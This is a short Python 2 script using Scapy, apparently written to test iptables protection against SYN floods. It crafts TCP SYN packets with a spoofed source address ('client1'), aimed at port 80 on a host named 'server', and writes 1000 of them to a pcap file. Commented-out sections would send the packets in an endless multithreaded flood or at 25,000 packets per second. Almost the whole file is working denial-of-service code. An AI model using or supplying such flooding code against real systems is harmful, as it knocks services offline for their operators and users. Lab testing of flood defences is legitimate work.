#! /usr/bin/env python
# Name : Subodh Pachghare
# CyberSpace Name : HaX0R (Cyberninja)
# Website : www.thesubodh.com
# Description : SYN Flood Packet creation for iptables prevention solution

import sys
from scapy.all import *
import threading
import os
import socket

MAX_TCP_SIZE = 65536

class ThreadClass(threading.Thread):
  def __init__(self, p):
    super(ThreadClass, self).__init__() 
    self.p = p

  def run(self):
  	while True:
		sendp(self.p, iface="eth0", loop=True)

if __name__ == "__main__":
	print "generating payload"
	payload = "\x00" + os.urandom(1458) + "\x00"
	print "done generating payload"

	dest_host = 'server'

	print "sending flood to destination " + dest_host
	dest_ip = socket.gethostbyname(dest_host)
	print "this as IP " + dest_ip

	print "spoofing as client1"
	src_ip = socket.gethostbyname("client1")

	#conf.verb=0
	print "Field Values of packet sent"
	p = Ether()/IP(src=src_ip, dst=dest_ip, id=1111,ttl=99)/TCP(sport=RandShort(), dport=[80], seq=12345, ack=1000, window=1000, flags="S")/payload
	#ls(p)
	print "generating packets file"
	wrpcap(sys.argv[1], p * 1000)
	#sendpfast(p * 1000, iface="eth0", pps=25000, loop=True)
	#print "starting %d threads" % n
	#for i in range(n):
	#	print "starting thread %d" % i
	#	ThreadClass(p).start()

	#i = 0
	#while True:
	#  print "starting thread %d" % i
	#  i += 1
	#  ThreadClass(p).start()
